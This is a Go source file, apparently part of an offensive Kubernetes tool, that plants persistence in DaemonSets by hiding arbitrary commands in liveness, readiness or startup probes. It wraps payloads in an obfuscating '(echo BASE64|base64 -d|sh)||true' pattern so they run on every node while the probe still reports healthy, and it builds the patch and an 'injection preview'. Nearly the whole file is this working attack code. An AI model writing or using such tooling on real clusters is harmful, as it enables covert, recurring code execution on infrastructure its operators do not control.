package persist

import (
	"encoding/json"
	"fmt"
	"strings"

	"kctl/pkg/types"
)

// DefaultProbeConfig 默认探针配置
var DefaultProbeConfig = types.ProbeConfig{
	PeriodSeconds:       30,
	InitialDelaySeconds: 10,
	TimeoutSeconds:      5,
	FailureThreshold:    3,
	SuccessThreshold:    1,
}

// BuildProbeCommand 构建探针命令
// 将载荷包装为探针可执行的命令
// 如果 encodeBase64 为 true，则使用 base64 编码载荷
func BuildProbeCommand(payload string, shell string, encodeBase64 bool) []string {
	if shell == "" {
		shell = "sh"
	}

	var finalPayload string
	if encodeBase64 {
		// 编码载荷: (echo 'BASE64'|base64 -d|sh)||true
		finalPayload = EncodePayload(payload, shell)
	} else {
		// 不编码，直接包装: (payload)||true
		// 需要转义特殊字符
		finalPayload = fmt.Sprintf("(%s)||true", payload)
	}

	// 返回命令数组
	return []string{"/bin/" + shell, "-c", finalPayload}
}

// BuildProbePatch 构建探针 Patch JSON
func BuildProbePatch(containerName string, probeType types.ProbeType, config *types.ProbeConfig) ([]byte, error) {
	if config == nil {
		config = &DefaultProbeConfig
	}

	// 构建探针对象
	probe := map[string]interface{}{
		"exec": map[string]interface{}{
			"command": config.Command,
		},
		"initialDelaySeconds": config.InitialDelaySeconds,
		"periodSeconds":       config.PeriodSeconds,
		"timeoutSeconds":      config.TimeoutSeconds,
		"failureThreshold":    config.FailureThreshold,
	}

	// 只有 readinessProbe 需要 successThreshold
	if probeType == types.ProbeTypeReadiness {
		probe["successThreshold"] = config.SuccessThreshold
	}

	// 构建容器 patch
	containerPatch := map[string]interface{}{
		"name": containerName,
	}

	// 根据探针类型设置字段
	switch probeType {
	case types.ProbeTypeLiveness:
		containerPatch["livenessProbe"] = probe
	case types.ProbeTypeReadiness:
		containerPatch["readinessProbe"] = probe
	case types.ProbeTypeStartup:
		containerPatch["startupProbe"] = probe
	default:
		return nil, fmt.Errorf("未知的探针类型: %s", probeType)
	}

	// 构建完整的 patch
	patch := map[string]interface{}{
		"spec": map[string]interface{}{
			"template": map[string]interface{}{
				"spec": map[string]interface{}{
					"containers": []interface{}{containerPatch},
				},
			},
		},
	}

	return json.MarshalIndent(patch, "", "  ")
}

// ValidateProbeType 验证探针类型
func ValidateProbeType(probeType string) (types.ProbeType, error) {
	switch strings.ToLower(probeType) {
	case "liveness", "livenessProbe":
		return types.ProbeTypeLiveness, nil
	case "readiness", "readinessProbe":
		return types.ProbeTypeReadiness, nil
	case "startup", "startupProbe":
		return types.ProbeTypeStartup, nil
	default:
		return "", fmt.Errorf("无效的探针类型: %s (可选: liveness, readiness, startup)", probeType)
	}
}

// GetAvailableProbeTypes 获取可用的探针类型（排除已存在的）
func GetAvailableProbeTypes(dsInfo *types.DaemonSetInfo) []types.ProbeType {
	var available []types.ProbeType

	if !dsInfo.HasLivenessProbe {
		available = append(available, types.ProbeTypeLiveness)
	}
	if !dsInfo.HasReadinessProbe {
		available = append(available, types.ProbeTypeReadiness)
	}
	if !dsInfo.HasStartupProbe {
		available = append(available, types.ProbeTypeStartup)
	}

	return available
}

// FormatProbeConfig 格式化探针配置
func FormatProbeConfig(config *types.ProbeConfig) string {
	var sb strings.Builder
	sb.WriteString("探针配置:\n")
	sb.WriteString(fmt.Sprintf("  类型: %s\n", config.Type))
	sb.WriteString(fmt.Sprintf("  命令: %v\n", config.Command))
	sb.WriteString(fmt.Sprintf("  执行间隔: %d 秒\n", config.PeriodSeconds))
	sb.WriteString(fmt.Sprintf("  初始延迟: %d 秒\n", config.InitialDelaySeconds))
	sb.WriteString(fmt.Sprintf("  超时时间: %d 秒\n", config.TimeoutSeconds))
	sb.WriteString(fmt.Sprintf("  失败阈值: %d\n", config.FailureThreshold))
	return sb.String()
}

// FormatPatchPreview 格式化 Patch 预览
func FormatPatchPreview(patch []byte, dsName, namespace, containerName string, probeType types.ProbeType) string {
	var sb strings.Builder
	sb.WriteString("========== 注入预览 ==========\n")
	sb.WriteString(fmt.Sprintf("目标 DaemonSet: %s/%s\n", namespace, dsName))
	sb.WriteString(fmt.Sprintf("目标容器: %s\n", containerName))
	sb.WriteString(fmt.Sprintf("探针类型: %s\n", probeType))
	sb.WriteString("\nPatch 内容:\n")
	sb.WriteString(string(patch))
	sb.WriteString("\n==============================\n")
	return sb.String()
}

// ProbeTypeDescription 获取探针类型描述
func ProbeTypeDescription(probeType types.ProbeType) string {
	switch probeType {
	case types.ProbeTypeLiveness:
		return "存活探针 - 失败时重启容器"
	case types.ProbeTypeReadiness:
		return "就绪探针 - 失败时从 Service 移除"
	case types.ProbeTypeStartup:
		return "启动探针 - 容器启动时执行"
	default:
		return "未知探针类型"
	}
}
